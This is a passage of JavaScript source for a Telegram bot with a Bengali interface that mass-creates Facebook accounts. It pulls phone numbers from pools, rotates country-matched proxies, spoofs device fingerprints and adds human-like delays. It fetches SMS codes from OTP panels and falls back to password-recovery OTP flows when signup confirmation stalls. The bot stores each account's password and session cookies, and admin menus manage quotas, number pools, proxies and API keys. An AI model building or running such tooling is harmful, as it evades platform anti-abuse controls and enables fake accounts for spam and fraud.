              void updateBatchProgress(
                [
                  `⚡ <b>[${i}/${totalTarget}]${replaceTry > 1 ? ` (চেষ্টা #${replaceTry})` : ''} টার্বো তৈরি হচ্ছে:</b>`,
                  `📱 <code>+${escapeHtml(fullNum)}</code> [${isoToFlag(numIso)} <b>${escapeHtml(numIso)}</b>]`,
                  `🌐 <b>Proxy ON:</b> <code>${pxPreview.url ? `${escapeHtml(pxPreview.isoApplied || numIso)}${pxPreview.sessionId ? ` • ssid:${escapeHtml(pxPreview.sessionId.slice(0, 6))}` : ''}` : 'Direct'}</code>`,
                ].join('\n'),
                i === 1
              );

              const hbxCfg = {
                ...cfg,
                engine_mode: 'limited_first',
                retries: autoReplaceOn ? 2 : 3,
                precheck_gql: false,
                hbx_mode: true,
                auto_proxy_country: true,
                auto_proxy_refresh: true,
                human_delay: cfg.fb_tools_human_delay === true,
              };
              const res = await runNodeAttempt(fullNum, password, hbxCfg, px, {
                baseCookiesRaw: userBaseCookie,
                shouldAbort: () => runState.abortRequested,
                proxiesPool: proxyPool,
                badProxies,
                skipPrecheck: true,
                fastMode: true,
                minRetries: autoReplaceOn ? 2 : 3,
                countryHint,
                onDebug: (m) => appendUserLog(user.id, m),
              });

              if (res.debugHtml) saveUserDebugHtml(user.id, res.debugHtml);
              markUserDone(user.id, fullNum);

              const acc = {
                index: i,
                number: fullNum,
                name: res.name || 'FB User',
                uid: res.uid || '—',
                password,
                cookie: formatCookieHeader(res.cookies || {}),
                pringer: res.printer || '',
                hwFp: res.hwFp || null,
                browserProfile: res.browserProfile || '',
                countryIso: res.countryIso || numIso,
                created: res.status === 'OK',
                reason: res.err || res.status || 'UNKNOWN',
                otps: [],
                otpCount: 0,
                pendingItem: null,
                poolNumberId: picked.poolNumberId,
              };

              if (res.status === 'OK') {
                runState.completed += 1;
                runState.okCount += 1;
                consumeQuota(user.id, 1);
                if (picked.poolNumberId) consumeClaimedNumber(picked.poolNumberId);
                storeUserAccount(user.id, {
                  name: acc.name,
                  phone: fullNum,
                  pass: password,
                  uid: acc.uid,
                  status: 'OK',
                  confirmed: true,
                  printer: acc.pringer,
                  engine: 'lol-fbtools',
                  cookies: res.cookies || {},
                });
                const uMap = readUsersMap();
                if (uMap[user.id]) {
                  uMap[user.id].totalOk += 1;
                  writeUsersMap(uMap);
                }
                await sendReadyAccountCard(i, acc);
                accounts.push(acc);
                slotResolved = true;
                break;
              }

              if ((res.status === 'CONFIRM' || res.status === 'CHECKPOINT') && res.pendingPayload) {
                const pItem = {
                  ...res.pendingPayload,
                  iso: res.countryIso || numIso,
                  country: countryHint,
                  rawProxy: res.pendingPayload.rawProxy || px || '',
                  autoVerify: true,
                  rotateProxyPerSend: true,
                  fbToolsSource: source,
                  poolNumberId: picked.poolNumberId || null,
                  poolClaimedAt: Date.now(),
                };
                acc.pendingItem = pItem;
                upsertUserPending(user.id, pItem);

                const verifyMatchedOtp = async (otpHit) => {
                  const entry = { number: fullNum, sender: otpHit.sms.sender, msg: otpHit.sms.message, code: otpHit.code, isLamix: Boolean(otpHit.sms?.isLamix) };
                  acc.otps.push(entry);
                  acc.otpCount += 1;
                  activeOtpVerifyPhones.add(fullNum);
                  try {
                    const confirmItem = {
                      ...acc.pendingItem,
                      proxy: adaptProxyForSession(acc.pendingItem.rawProxy || acc.pendingItem.proxy || px, {
                        iso: numIso,
                        autoCountry: true,
                        refreshSession: true,
                      }).url || acc.pendingItem.proxy,
                    };
                    const cRes = acc.pendingItem.flow === 'recovery'
                      ? await submitRecoveryOtpAndLogin(confirmItem, otpHit.code, password, hbxCfg)
                      : await performOtpConfirm(confirmItem, otpHit.code, hbxCfg, userBaseCookie);
                    if (cRes.status === 'OK') {
                      acc.created = true;
                      acc.uid = cRes.uid || acc.uid;
                      acc.cookie = formatCookieHeader(cRes.cookies || {});
                      acc.pendingItem = null;
                      if (acc.poolNumberId) consumeClaimedNumber(acc.poolNumberId);
                      storeUserAccount(user.id, {
                        name: acc.name,
                        phone: fullNum,
                        pass: password,
                        uid: acc.uid,
                        status: 'OK',
                        confirmed: true,
                        printer: acc.pringer,
                        engine: 'lol-fbtools',
                        cookies: cRes.cookies || {},
                      });
                      writeUserPending(user.id, readUserPending(user.id).filter((p) => p.phone !== fullNum));
                      const uMap = readUsersMap();
                      if (uMap[user.id]) {
                        uMap[user.id].totalOk += 1;
                        writeUsersMap(uMap);
                      }
                      return { ok: true };
                    }
                    if (cRes.status === 'RETRY' && cRes.item) {
                      acc.pendingItem = cRes.item;
                      upsertUserPending(user.id, cRes.item);
                    }
                    return { ok: false };
                  } finally {
                    activeOtpVerifyPhones.delete(fullNum);
                  }
                };

                // Step 1: Fast check if initial signup POST already delivered OTP on Lamix / Panel
                let otpFound = await pollOtpForNumber(fullNum, 1000);
                if (otpFound) {
                  const vRes = await verifyMatchedOtp(otpFound);
                  if (vRes.ok) {
                    runState.completed += 1;
                    runState.okCount += 1;
                    consumeQuota(user.id, 1);
                    await sendReadyAccountCard(i, acc, otpFound.code, otpFound.sms?.isLamix ? 'Lamix Panel' : otpFound.sms?.source);
                    accounts.push(acc);
                    slotResolved = true;
                    break;
                  }
                }

                // Step 2: Fast proxy-rotated OTP resend + automatic PC-Clone recovery fallback (non-blocking handoff to Watcher!)
                const fastRounds = Math.min(otpResendRounds, 2);
                let lastSendVia = '';
                for (let r = 1; r <= fastRounds && !runState.abortRequested && !slotResolved; r++) {
                  let resendRes = await performOtpResendOnce(acc.pendingItem, hbxCfg, userBaseCookie, {
                    proxiesPool: proxyPool,
                    badProxies,
                    rotateProxy: true,
                    proxyIndex: r + replaceTry - 1,
                    shouldAbort: () => runState.abortRequested,
                  }).catch(() => ({ ok: false, reason: 'resend error' }));

                  // If standard confirmation resend fails (or on round >= 2 for stronger delivery), escalate to PC-Clone Proxy-Rotated Recovery OTP!
                  if ((!resendRes.ok && !resendRes.alreadyConfirmed) || r >= 2) {
                    const pcRaw = proxyPool.length > 0
                      ? selectSmartProxy(proxyPool, r + i + 2, badProxies, 'rotate', cfg.proxy || null, numIso)
                      : (px || cfg.proxy || null);
                    const pcAdapted = adaptProxyForSession(pcRaw, {
                      iso: numIso,
                      autoCountry: true,
                      refreshSession: true,
                      forcedSessionId: crypto.randomBytes(6).toString('hex'),
                    });
                    const pcTrig = await triggerForgotPasswordOtp(fullNum, hbxCfg, pcAdapted.url || pcRaw, {
                      freshCookies: true,
                      gqlJar: null,
                      assumeExists: true,
                      fastMode: true,
                      proxiesPool: proxyPool,
                      badProxies,
                      rotateProxyPerRound: true,
                      resends: 2,
                      recoveryUrls: normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true }),
                      cc: picked.det?.cc || cfg.cc,
                      iso: numIso,
                      rawProxy: pcRaw,
                      nameHint: acc.name,
                      newPass: password,
                      shouldAbort: () => runState.abortRequested,
                      onAfterOtpSent: async () => {
                        const hitNow = await pollOtpForNumber(fullNum, 1000);
                        if (hitNow) {
                          otpFound = hitNow;
                          return { stop: true, earlyHit: hitNow };
                        }
                        return { stop: false };
                      },
                    }).catch(() => ({ ok: false }));
                    if (pcTrig.ok && pcTrig.item) {
                      pcTrig.item.resendCount = Number(acc.pendingItem?.resendCount || 0) + Math.max(1, Number(pcTrig.otpsSent || 1));
                      pcTrig.item.autoVerify = true;
                      pcTrig.item.iso = numIso;
                      pcTrig.item.country = countryHint;
                      pcTrig.item.name = acc.name;
                      pcTrig.item.pass = password;
                      resendRes = {
                        ok: true,
                        via: `PC-Clone (${pcTrig.via || 'recover'})`,
                        resendCount: pcTrig.item.resendCount,
                        proxyUsed: Boolean(pcAdapted.url || pcRaw),
                        proxyIso: pcAdapted.isoApplied || numIso,
                        proxySession: pcAdapted.sessionId || '',
                        item: pcTrig.item,
                      };
                    }
                  }

                  if (resendRes.item) {
                    acc.pendingItem = resendRes.item;
                    upsertUserPending(user.id, acc.pendingItem);
                  }

                  if (resendRes.alreadyConfirmed) {
                    acc.created = true;
                    acc.uid = resendRes.uid || acc.uid;
                    acc.cookie = formatCookieHeader(resendRes.cookies || {});
                    acc.pendingItem = null;
                    if (acc.poolNumberId) consumeClaimedNumber(acc.poolNumberId);
                    storeUserAccount(user.id, {
                      name: acc.name,
                      phone: fullNum,
                      pass: password,
                      uid: acc.uid,
                      status: 'OK',
                      confirmed: true,
                      printer: acc.pringer,
                      engine: 'lol-fbtools',
                      cookies: resendRes.cookies || {},
                    });
                    writeUserPending(user.id, readUserPending(user.id).filter((p) => p.phone !== fullNum));
                    runState.completed += 1;
                    runState.okCount += 1;
                    consumeQuota(user.id, 1);
                    await sendReadyAccountCard(i, acc);
                    accounts.push(acc);
                    slotResolved = true;
                    break;
                  }

                  if (resendRes.ok) lastSendVia = resendRes.via || 'resend';
                  const pxLogTag = resendRes.proxyUsed
                    ? `${resendRes.proxyIso || numIso}${resendRes.proxySession ? ':' + resendRes.proxySession.slice(0, 6) : ''}`
                    : 'Direct';
                  appendUserLog(
                    user.id,
                    `FB TOOLS +${fullNum} [${numIso}] OTP Trigger ${r}/${fastRounds} (${resendRes.ok ? resendRes.via : resendRes.reason}) [PX:${pxLogTag}]`
                  );

                  void updateBatchProgress(
                    [
                      `📩 <b>[${i}/${totalTarget}] OTP পাঠানো হয়েছে (${r}/${fastRounds}) • Lamix চেক...</b>`,
                      `📱 <code>+${escapeHtml(fullNum)}</code> • 🌐 <code>${escapeHtml(pxLogTag)}</code>`,
                      resendRes.ok
                        ? `✅ মেথড: <code>${escapeHtml(resendRes.via)}</code>`
                        : `⚠️ নোট: <code>${escapeHtml(String(resendRes.reason || '').slice(0, 50))}</code>`,
                    ].join('\n'),
                    false
                  );

                  if (!otpFound) otpFound = await pollOtpForNumber(fullNum, 1900);
                  if (otpFound) {
                    const vRes = await verifyMatchedOtp(otpFound);
                    if (vRes.ok) {
                      runState.completed += 1;
                      runState.okCount += 1;
                      consumeQuota(user.id, 1);
                      await sendReadyAccountCard(i, acc, otpFound.code, otpFound.sms?.isLamix ? 'Lamix Panel' : otpFound.sms?.source);
                      accounts.push(acc);
                      slotResolved = true;
                      break;
                    }
                  }
                  if (resendRes.rateLimited) break;
                }

                if (slotResolved) break;

                // Hand off quickly to concurrent Multi-OTP Watcher + show instant OTP Send / Lamix card right away!
                runState.completed += 1;
                runState.pendingCount += 1;
                consumeQuota(user.id, 1);
                await sendPendingAccountCard(i, acc, lastSendVia);
                accounts.push(acc);
                slotResolved = true;
                break;
              } else {
                // Failed signup attempt
                if (source === 'pool' && picked.poolNumberId) consumeClaimedNumber(picked.poolNumberId);
                if (source === 'lamix') unassignLamixNumber(lamixTok, fullNum).catch(() => {});
                const canTryAnother = replaceTry < maxReplacePerSlot && (source !== 'custom' || customQueue.length > 0);
                if (canTryAnother && !runState.abortRequested) {
                  appendUserLog(user.id, `FB TOOLS +${fullNum} signup failed (${acc.reason}) -> opening new account`);
                  void updateBatchProgress(
                    `⚠️ <code>+${escapeHtml(fullNum)}</code> ব্যর্থ (<code>${escapeHtml(String(acc.reason).slice(0, 45))}</code>) — পরের নাম্বারে যাচ্ছি...`,
                    false
                  );
                  await sleepAbort(45, () => runState.abortRequested);
                  continue;
                }
                runState.completed += 1;
                runState.failCount += 1;
                consumeQuota(user.id, 1);
                accounts.push(acc);
                slotResolved = true;
              }
            }
          }
        };

        await Promise.all(Array.from({ length: workerCount }, () => runWorkerSlot()));

        runState.running = false;
        runState.currentNumber = null;

        // LOL show_batch_summary
        const watchTargets = accounts.filter((a) => a.pendingItem);
        const summaryLines = [
          `📋 <b>BATCH SUMMARY &amp; ALL CREATED ACCOUNTS</b>`,
          DIVIDER,
          `✔ <b>তৈরি সফল (Ready):</b> <code>${accounts.filter((a) => a.created).length}</code>`,
          `🔐 <b>OTP অপেক্ষমাণ:</b> <code>${accounts.filter((a) => a.pendingItem).length}</code>`,
          `✘ <b>ব্যর্থ (Failed):</b> <code>${accounts.filter((a) => !a.created && !a.pendingItem).length}</code>`,
          ``,
          ...accounts.map((a) => {
            if (a.created) return `#${a.index} ✔ <b>${escapeHtml(a.name)}</b> | <code>${escapeHtml(a.uid)}</code> | <code>+${escapeHtml(a.number)}</code>`;
            if (a.pendingItem) return `#${a.index} 🔐 <code>+${escapeHtml(a.number)}</code> (OTP পেলে অটো ভেরিফাই হবে)`;
            return `#${a.index} ✘ <code>+${escapeHtml(a.number)}</code> (${escapeHtml(String(a.reason).slice(0, 60))})`;
          }),
        ];
        const summaryQuickRows = accounts
          .filter((a) => a.created || a.pendingItem)
          .slice(0, 4)
          .map((a) => [
            btnOk(`📤 OTP (+${String(a.number).slice(-5)})`, `otp:pc_send:${a.number}`),
            btnNav(`📡 Lamix (+${String(a.number).slice(-5)})`, `otp:check_lamix:${a.number}`),
          ]);
        if (progMsgId) {
          await editMessage(chatId, progMsgId, summaryLines.join('\n'), {
            inline_keyboard: [
              ...summaryQuickRows,
              [btnOk('📦 অ্যাকাউন্টস দেখুন', 'menu:accounts'), btnNav('🛠 FB Tools', 'menu:fb_tools')],
            ],
          });
        }

        // Launch Multi-OTP Watcher if any valid/confirm accounts exist
        if (watchTargets.length > 0 && !runState.abortRequested) {
          await runFbToolsMultiOtpWatcher(chatId, user, watchTargets, cfg, { source });
        }

      // Exact 4 HBX post_batch_menu options
      const lastCfg = fbToolsLastBatchConfig.get(user.id);
      const postKb = [];
      if (lastCfg && lastCfg.source !== 'custom') {
        postKb.push([
          btnOk('🔄 একই রেঞ্জে আরেকটি ব্যাচ চালান', 'fbtools:rerun'),
        ]);
        postKb.push([
          btnNav('🌐 রেঞ্জ / দেশ পরিবর্তন করুন', 'fbtools:change_source'),
        ]);
      }
      postKb.push([
        btnOk('📦 তৈরি হওয়া অ্যাকাউন্ট দেখুন', 'menu:accounts'),
        btnNav('🔙 FB Tools মেনুতে ফিরুন', 'menu:fb_tools'),
      ]);
      postKb.push([btnNav('❌ মেইন মেনুতে যান', 'menu:home')]);
      await sendMessage(
        chatId,
        [
          `✅ <b>BATCH COMPLETE — এখন কী করতে চান?</b>`,
          DIVIDER,
          lastCfg ? `📦 <b>সোর্স:</b> <code>${escapeHtml(lastCfg.rangeLabel || country?.name || lastCfg.source)}</code>` : '',
          `নিচের ৪টি অপশন থেকে পরবর্তী কাজ বেছে নিন:`,
        ].filter(Boolean).join('\n'),
        { inline_keyboard: postKb }
      );
    } catch (err) {
      runState.running = false;
      pushBotLog(`LOL FB Tools batch error: ${err instanceof Error ? err.message : String(err)}`);
      await sendMessage(chatId, `❌ <b>FB Tools এ সমস্যা হয়েছে:</b> <code>${escapeHtml(err instanceof Error ? err.message : 'Unknown error')}</code>`, {
        inline_keyboard: [[btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]],
      });
    }
  })();
}

  async function renderAdminHome(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    const pending = users.filter((u) => u.status === 'pending');
    const approved = users.filter((u) => u.status === 'approved');
    const blocked = users.filter((u) => u.status === 'blocked');
    const runningList = Array.from(activeRuns.entries()).filter(([, r]) => r.running);
    const globalPx = readGlobalProxies();
    const countryStats = getCountryInventoryStats();
    const totalAvailNums = countryStats.reduce((s, c) => s + c.available, 0);
    const panelsList = readPanelsStore().panels;
    const activePanelsCnt = panelsList.filter((p) => p.active !== false).length;
    const lamixTok = resolveFbToolsLamixToken();
    const voltexKeys = resolveFbTools2oo9Keys();
    const totalOk = users.reduce((s, u) => s + (u.totalOk || 0), 0);
    const totalOtp = users.reduce((s, u) => s + (u.totalPending || 0), 0);
    const totalUsedToday = users.reduce((s, u) => s + (u.usedToday || 0), 0);
    const upSec = startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0;
    const brand = st.brandName || DEFAULT_BRAND_NAME;

    const lines = [
      `👑 <b>${escapeHtml(brand)} • ADMIN CONTROL CENTER</b>`,
      DIVIDER,
      `🏷 <b>Brand:</b> <code>${escapeHtml(brand)}</code>  •  👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)} (<code>${escapeHtml(st.adminId)}</code>)`,
      `📢 <b>Channel:</b> ${escapeHtml(getChannelHandle(st.channelUrl))}  •  🚦 <b>Status:</b> ${st.maintenanceMode ? '🛠 MAINTENANCE' : '🟢 LIVE'}`,
      ``,
      `👥 <b>Users:</b> <code>${users.length}</code> (✅ ${approved.length} • 🟡 ${pending.length} • 🚫 ${blocked.length})`,
      `🌍 <b>Number Pool:</b> <code>${countryStats.length}</code> countries • <code>${totalAvailNums}</code> available`,
      `🔌 <b>OTP API Panels:</b> <code>${activePanelsCnt}/${panelsList.length}</code> active • ⏱ Valid: <code>${st.numberValidMinutes || 10}m</code>`,
      `🔑 <b>Global API Keys:</b> Voltex ${voltexKeys.length > 0 ? `🟢 (<code>${voltexKeys.length}</code>)` : '🔴 OFF'} • Lamix ${lamixTok ? '🟢 ON' : '🔴 OFF'}`,
      `📊 <b>Global Totals:</b> ✅ <code>${totalOk}</code>  •  🔐 <code>${totalOtp}</code>  •  🎯 Today: <code>${totalUsedToday}</code>`,
      `⚡ <b>Active Runs:</b> <code>${runningList.length}</code>  •  🌐 <b>Global Proxies:</b> <code>${globalPx.length}</code>  •  ⏱ <code>${formatDuration(upSec)}</code>`,
      `🛡 <b>Approval:</b> ${st.requireApproval ? '🟢 ON' : '🔴 OFF'}  •  <b>Force Join:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'}  •  <b>Share PX:</b> ${st.shareGlobalProxies ? '🟢 ON' : '🔴 OFF'}`,
    ];

    const rows = [];
    if (pending.length > 0) {
      lines.push('', `<b>🟡 Pending Approval (${pending.length}):</b>`);
      pending.slice(0, 4).forEach((u) => {
        lines.push(`• ${escapeHtml(u.firstName)} (@${escapeHtml(u.username || 'none')}) — <code>${u.id}</code>`);
        rows.push([
          btnOk(`✅ Approve ${u.id}`, `admin:approve:${u.id}`),
          btnBad(`🚫 Block ${u.id}`, `admin:block:${u.id}`),
        ]);
      });
    }
    if (runningList.length > 0) {
      lines.push('', `<b>⚡ Active Runs:</b>`);
      runningList.slice(0, 3).forEach(([id, runSt]) => {
        lines.push(`• User <code>${id}</code>: <code>${runSt.completed}/${runSt.total}</code> (✅${runSt.okCount} 🔐${runSt.pendingCount})`);
        rows.push([btnBad(`🛑 Stop User ${id}`, `admin:stopuser:${id}`)]);
      });
    }
    rows.push([
      btnOk(`🌍 Countries & Numbers (${totalAvailNums})`, 'admin:countries'),
      btnOk(`🔌 OTP API Panels (${activePanelsCnt}/${panelsList.length})`, 'admin:panels'),
    ]);
    rows.push([
      btnOk('🔑 API Keys (Lamix & Voltex)', 'admin:apikeys'),
    ]);
    rows.push([
      btnNav(`👥 Users (${users.length})`, 'admin:users:all:0'),
      btnNav('📊 Users Analytics', 'admin:analytics'),
    ]);
    rows.push([
      btnNav(`🌐 Global Proxies (${globalPx.length})`, 'admin:proxies'),
      btnNav('📦 Downloads & Backup', 'admin:backup'),
    ]);
    rows.push([
      btnNav(`⚡ Live Runs (${runningList.length})`, 'admin:live'),
      btnOk('📣 Broadcast All', 'admin:broadcast'),
    ]);
    rows.push([
      btnNav('⚙️ Policy & Defaults', 'admin:settings'),
      btnNav('🏷 Brand & Channel', 'admin:brand'),
    ]);
    rows.push([
      btnNav('📜 System Logs', 'admin:logs'),
      st.maintenanceMode ? btnBad('🛠 Maint: ON', 'admin:toggle_maint') : btnOk('🟢 Mode: LIVE', 'admin:toggle_maint'),
    ]);
    rows.push([
      btnOk('🔄 Refresh Admin', 'admin:home'),
      btnNav('⬅️ Main Menu', 'menu:home'),
    ]);

    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderAdminApiKeysMenu(chatId, editMsgId) {
    const st = readSettings();
    const lamixTok = resolveFbToolsLamixToken();
    const voltexKeys = resolveFbTools2oo9Keys();
    const customVoltexUrl = resolveFbToolsVoltexUrl();
    const panelsList = readPanelsStore().panels;
    const activePanelsCnt = panelsList.filter((p) => p.active !== false).length;

    let voltexStatus = '🔴 Disabled / None';
    if (Array.isArray(st.globalVoltexKeys) && st.globalVoltexKeys.length > 0) {
      voltexStatus = `🟢 <code>${st.globalVoltexKeys.length}</code> Custom Key(s): ${st.globalVoltexKeys.map((k) => `<code>${escapeHtml(maskSecretKey(k))}</code>`).join(', ')}`;
    } else if (!st.globalVoltexDisabled && voltexKeys.length > 0) {
      voltexStatus = `🟡 Default Active (<code>${escapeHtml(maskSecretKey(voltexKeys[0]))}</code>)`;
    }

    const lamixStatus = st.globalLamixToken
      ? `🟢 <code>${escapeHtml(maskSecretKey(st.globalLamixToken))}</code>`
      : lamixTok
      ? `🟡 Env Fallback (<code>${escapeHtml(maskSecretKey(lamixTok))}</code>)`
      : '🔴 Not Set';

    const txt = [
      `🔑 <b>GLOBAL API KEYS VAULT (ADMIN ONLY)</b>`,
      DIVIDER,
      `<i>Users automatically use these configured servers behind neutral names (LOL সার্ভার ১ / LOL সার্ভার ২). Regular users cannot view, add, or edit any API keys.</i>`,
      ``,
      `🌐 <b>Voltex / 2oo9 (LOL সার্ভার ১):</b>`,
      `• Keys (<code>mauthapi</code>): ${voltexStatus}`,
      `• Endpoint: <code>${escapeHtml(customVoltexUrl || HBX_API_2OO9_BASE)}</code>`,
      ``,
      `📡 <b>Lamix SMS (LOL সার্ভার ২):</b>`,
      `• Bearer Token: ${lamixStatus}`,
      `• Endpoint: <code>${escapeHtml(LAMIX_BASE_URL)}</code>`,
      ``,
      `🧩 <b>Custom OTP API Panels:</b> <code>${activePanelsCnt}/${panelsList.length}</code> active`,
    ].join('\n');

    const kb = {
      inline_keyboard: [
        [
          btnOk('🔑 Set Lamix Token', 'admin:apikey_set_lamix'),
          btnBad('🗑 Clear Lamix', 'admin:apikey_clr_lamix'),
        ],
        [
          btnOk('🔑 Set Voltex Keys', 'admin:apikey_set_voltex'),
          btnBad('🗑 Clear Voltex', 'admin:apikey_clr_voltex'),
        ],
        [
          btnNav('🌐 Set Voltex URL', 'admin:apikey_set_voltex_url'),
          btnOk('🧪 Test Both APIs', 'admin:apikey_test'),
        ],
        [
          btnNav('🔌 OTP API Panels', 'admin:panels'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminBrandMenu(chatId, editMsgId) {
    const st = readSettings();
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const txt = [
      `🏷 <b>BRAND, OWNER & CHANNEL PROFILE</b>`,
      DIVIDER,
      `🏷 <b>Brand Name:</b> <code>${escapeHtml(brand)}</code>`,
      `👑 <b>Owner Username:</b> ${escapeHtml(st.adminUsername)}`,
      `🔗 <b>Owner Link:</b> <code>${escapeHtml(st.ownerUrl || DEFAULT_OWNER_URL)}</code>`,
      `🆔 <b>Primary Admin ID:</b> <code>${escapeHtml(st.adminId)}</code>`,
      `📢 <b>Official Channel:</b> <code>${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}</code>`,
      `🔐 <b>Force Join Channel:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'}`,
      ``,
      `💬 <b>Welcome Note:</b>`,
      `<blockquote><i>${escapeHtml(st.welcomeNote)}</i></blockquote>`,
      ``,
      `<i>Note: For Force Join to check membership automatically, add the bot as an Admin in ${escapeHtml(getChannelHandle(st.channelUrl))}.</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('🏷 Edit Brand Name', 'admin:set_brand'),
          btnNav('👑 Edit Owner Link', 'admin:set_owner'),
        ],
        [
          btnNav('📢 Edit Channel URL', 'admin:set_channel'),
          btnNav('💬 Edit Welcome Note', 'admin:set_welcome'),
        ],
        [
          st.requireChannelJoin ? btnOk('🔐 Force Join: ON', 'admin:toggle_forcejoin') : btnBad('🔐 Force Join: OFF', 'admin:toggle_forcejoin'),
          btnNav('🧪 Test Channel Bot', 'admin:test_channel'),
        ],
        [
          btnUrl('📢 Open Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
        ],
        [btnNav('⬅️ Admin Panel', 'admin:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminSettings(chatId, editMsgId) {
    const st = readSettings();
    const txt = [
      `⚙️ <b>BOT GLOBAL POLICY & ENGINE DEFAULTS</b>`,
      DIVIDER,
      `🔐 <b>Require Admin Approval:</b> ${st.requireApproval ? '🟢 ON' : '🔴 OFF'}`,
      `📢 <b>Force Channel Join:</b> ${st.requireChannelJoin ? '🟢 ON' : '🔴 OFF'} (${escapeHtml(getChannelHandle(st.channelUrl))})`,
      `🛠 <b>Maintenance Mode:</b> ${st.maintenanceMode ? '🔴 ON (Users Paused)' : '🟢 OFF (Normal)'}`,
      `🌐 <b>Share Global Proxy Pool:</b> ${st.shareGlobalProxies ? '🟢 ON' : '🔴 OFF'}`,
      `🎯 <b>Default Daily Quota:</b> <code>${st.defaultDailyLimit}</code>`,
      `⏱ <b>Number Valid Time:</b> <code>${st.numberValidMinutes || 10} min</code>`,
      `🚀 <b>New User Default Engine:</b> <code>${escapeHtml((st.defaultEngineMode || 'hybrid').toUpperCase())}</code>`,
      `🔍 <b>New User Default GQL Check:</b> ${st.defaultPrecheckGql !== false ? '🟢 ON' : '🔴 OFF'}`,
      ``,
      `💬 <b>Welcome Note:</b>`,
      `<blockquote><i>${escapeHtml(st.welcomeNote)}</i></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          st.requireApproval ? btnOk('🔐 Approval: ON', 'admin:toggle_approval') : btnBad('🔐 Approval: OFF', 'admin:toggle_approval'),
          st.shareGlobalProxies ? btnOk('🌐 Share Proxies: ON', 'admin:toggle_sharepx') : btnBad('🌐 Share Proxies: OFF', 'admin:toggle_sharepx'),
        ],
        [
          st.maintenanceMode ? btnBad('🛠 Maintenance: ON', 'admin:toggle_maint') : btnOk('🛠 Maintenance: OFF', 'admin:toggle_maint'),
          st.requireChannelJoin ? btnOk('📢 Force Join: ON', 'admin:toggle_forcejoin') : btnBad('📢 Force Join: OFF', 'admin:toggle_forcejoin'),
        ],
        [
          btnNav(`🚀 Def Engine: ${(st.defaultEngineMode || 'hybrid').toUpperCase()}`, 'admin:cycle_def_engine'),
          st.defaultPrecheckGql !== false ? btnOk('🔍 Def GQL: ON', 'admin:toggle_def_gql') : btnBad('🔍 Def GQL: OFF', 'admin:toggle_def_gql'),
        ],
        [
          btnNav('🎯 Set Default Limit', 'admin:set_default_limit'),
          btnNav('💬 Edit Welcome Note', 'admin:set_welcome'),
        ],
        [
          btnNav(`⏱ Valid Time (${st.numberValidMinutes || 10}m)`, 'admin:set_valid_time'),
          btnOk('♻️ Sync Engine/GQL to All Users', 'admin:sync_defaults'),
        ],
        [
          btnNav('🏷 Brand & Channel', 'admin:brand'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminCountries(chatId, editMsgId) {
    const st = readSettings();
    const list = getCountryInventoryStats();
    const totalAll = list.reduce((s, c) => s + c.total, 0);
    const totalAvail = list.reduce((s, c) => s + c.available, 0);
    const lines = [
      `🌍 <b>ADMIN COUNTRIES &amp; NUMBER POOL</b>`,
      DIVIDER,
      `📊 <b>Summary:</b> <code>${list.length}</code> countries • <code>${totalAvail}</code> available / <code>${totalAll}</code> total`,
      `⏱ <b>Number Valid Time:</b> <code>${st.numberValidMinutes || 10} min</code>`,
      ``,
    ];
    const rows = [];
    if (list.length === 0) {
      lines.push(`<i>No countries added yet. Tap Add Country to get started!</i>`);
    } else {
      list.forEach((c, idx) => {
        lines.push(`${idx + 1}. 🏳 <b>${escapeHtml(c.name)}</b> — Total: <code>${c.total}</code> | Used: <code>${c.used}</code> | Avail: <code>${c.available}</code>`);
      });
      for (let i = 0; i < Math.min(list.length, 10); i += 2) {
        const row = [];
        for (const c of list.slice(i, i + 2)) {
          row.push(btnOk(`📤 ${c.name.slice(0, 14)} (${c.available})`, `admin:country_upload:${c.id}`));
        }
        rows.push(row);
      }
    }
    rows.push([
      btnOk('➕ Add Country', 'admin:country_add'),
      btnOk('📤 Upload Numbers', 'admin:country_upload'),
    ]);
    rows.push([
      btnNav('🔄 Reset Numbers', 'admin:country_reset'),
      btnBad('🗑 Delete Country', 'admin:country_del'),
    ]);
    rows.push([
      btnNav(`⏱ Valid Time (${st.numberValidMinutes || 10}m)`, 'admin:set_valid_time'),
      btnOk('🔄 Refresh', 'admin:countries'),
    ]);
    rows.push([btnNav('⬅️ Admin Panel', 'admin:home')]);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminCountryPickList(chatId, mode, editMsgId) {
    const list = getCountryInventoryStats();
    const meta = {
      upload: { title: '📤 SELECT COUNTRY TO UPLOAD NUMBERS', prefix: 'admin:country_upload:', btnFn: btnOk },
      reset: { title: '🔄 SELECT COUNTRY TO RESET NUMBERS', prefix: 'admin:country_reset:', btnFn: btnNav },
      del: { title: '🗑 SELECT COUNTRY TO DELETE', prefix: 'admin:country_del:', btnFn: btnBad },
    }[mode];
    const rows = [];
    for (let i = 0; i < list.length; i += 2) {
      const row = [];
      for (const c of list.slice(i, i + 2)) {
